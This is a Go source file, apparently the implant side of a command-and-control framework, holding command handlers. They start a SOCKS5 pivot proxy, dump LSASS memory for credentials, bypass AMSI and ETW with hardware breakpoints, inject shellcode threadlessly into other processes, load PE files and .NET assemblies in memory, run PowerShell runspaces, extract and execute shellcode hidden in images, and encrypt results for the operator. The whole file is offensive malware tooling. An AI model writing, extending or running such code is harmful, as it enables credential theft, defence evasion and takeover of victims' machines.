// ─── Phase 11: SOCKS5 Pivot ───────────────────────────────────────────────────

func handleSOCKS5Start(cmd *types.Command, result *types.CommandResult) {
	addr := cmd.Socks5Addr
	if addr == "" {
		addr = "127.0.0.1:1080"
	}
	bound, err := StartSOCKS5(addr)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] SOCKS5 proxy listening on %s — configure proxychains to use it", bound)
}

func handleSOCKS5Stop(result *types.CommandResult) {
	result.Output = "[+] " + StopSOCKS5()
}

func handleSOCKS5Status(result *types.CommandResult) {
	result.Output = "[socks5] " + SOCKS5Status()
}

// ── New technique handlers ────────────────────────────────────────────────────

func handleLSASSDumpDup(cmd *types.Command, result *types.CommandResult) {
	out := cmd.DestinationPath
	if out == "" {
		out = os.TempDir() + string(os.PathSeparator) + "lsass_dup.dmp"
	}
	msg, err := lsassDumpViaDup(out)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] " + msg
}

func handleLSASSDumpWER(cmd *types.Command, result *types.CommandResult) {
	out := cmd.DestinationPath
	if out == "" {
		out = os.TempDir() + string(os.PathSeparator) + "lsass_wer.dmp"
	}
	msg, err := lsassDumpViaWER(out)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] " + msg
}

func handleAMSIHWBP(result *types.CommandResult) {
	if err := bypassAMSIHWBP(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] Patchless AMSI bypass active (HWBP on AmsiScanBuffer)"
}

func handleETWHWBP(result *types.CommandResult) {
	if err := bypassETWHWBP(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] Patchless ETW bypass active (HWBP on EtwEventWrite)"
}

func handleThreadlessInject(cmd *types.Command, result *types.CommandResult) {
	if cmd.InjectPID == 0 {
		result.Error = "inject_pid required"
		result.ExitCode = 1
		return
	}
	if cmd.ShellcodeB64 == "" {
		result.Error = "shellcode_b64 required"
		result.ExitCode = 1
		return
	}
	shellcode, err := base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
	if err != nil {
		result.Error = "shellcode_b64 decode: " + err.Error()
		result.ExitCode = 1
		return
	}
	dllName := cmd.SacrificialDLL   // reuse: DLL containing the export to hook
	exportName := cmd.InjectMethod  // reuse: export function name
	if dllName == "" {
		dllName = "ntdll.dll"
	}
	if exportName == "" {
		exportName = "NtFlushInstructionCache"
	}
	if err := threadlessInject(cmd.InjectPID, dllName, exportName, shellcode); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Threadless hook placed on %s!%s in PID %d — waiting for caller",
		dllName, exportName, cmd.InjectPID)
}

func handlePELoad(cmd *types.Command, result *types.CommandResult) {
	if cmd.ShellcodeB64 == "" && len(cmd.FileContent) == 0 {
		result.Error = "shellcode_b64 (base64 PE bytes) or file_content required"
		result.ExitCode = 1
		return
	}
	var peBytes []byte
	var err error
	if len(cmd.FileContent) > 0 {
		peBytes = cmd.FileContent
	} else {
		peBytes, err = base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
		if err != nil {
			result.Error = "pe decode: " + err.Error()
			result.ExitCode = 1
			return
		}
	}
	base, err := peLoad(peBytes)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] PE loaded at 0x%X", base)
}

func handleDotnetExec(cmd *types.Command, result *types.CommandResult) {
	// Fields: SourcePath=assemblyPath, TokenUser=typeName, TokenArgs=methodName, TokenPass=argument
	asmPath := cmd.SourcePath
	if asmPath == "" {
		result.Error = "source_path (assembly .dll path) required"
		result.ExitCode = 1
		return
	}
	typeName := cmd.TokenUser
	if typeName == "" {
		result.Error = "token_user (type name) required"
		result.ExitCode = 1
		return
	}
	methodName := cmd.TokenArgs
	if methodName == "" {
		result.Error = "token_args (method name) required"
		result.ExitCode = 1
		return
	}
	argument := cmd.TokenPass
	retCode, err := dotnetExecute(asmPath, typeName, methodName, argument)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] .NET %s.%s() returned %d", typeName, methodName, retCode)
}

func handlePSRunspace(cmd *types.Command, result *types.CommandResult) {
	script := cmd.Command
	if script == "" && len(cmd.Args) > 0 {
		script = strings.Join(cmd.Args, " ")
	}
	if script == "" {
		result.Error = "command (PowerShell script) required"
		result.ExitCode = 1
		return
	}
	bridgePath := cmd.SourcePath // optional: path to psbridge.dll
	out, err := psRunspace(script, bridgePath)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = out
}

func handleStegoExtract(cmd *types.Command, result *types.CommandResult) {
	imgPath := cmd.SourcePath
	if imgPath == "" {
		result.Error = "source_path (image file) required"
		result.ExitCode = 1
		return
	}
	var key byte
	if cmd.InjectMethod != "" {
		n, _ := strconv.ParseUint(cmd.InjectMethod, 0, 8)
		key = byte(n)
	}
	if err := stegoExtractAndRun(imgPath, key); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Shellcode extracted from %s and executed", imgPath)
}

func encryptResult(agent *Agent, result *types.CommandResult) {
	if result.Output != "" {
		if encrypted, err := agent.crypto.EncryptData([]byte(result.Output)); err == nil {
			result.Output = encrypted
			result.Encrypted = true
		}
	}
	if result.Error != "" {
		if encrypted, err := agent.crypto.EncryptData([]byte(result.Error)); err == nil {
			result.Error = encrypted
			result.Encrypted = true
		}
	}
}
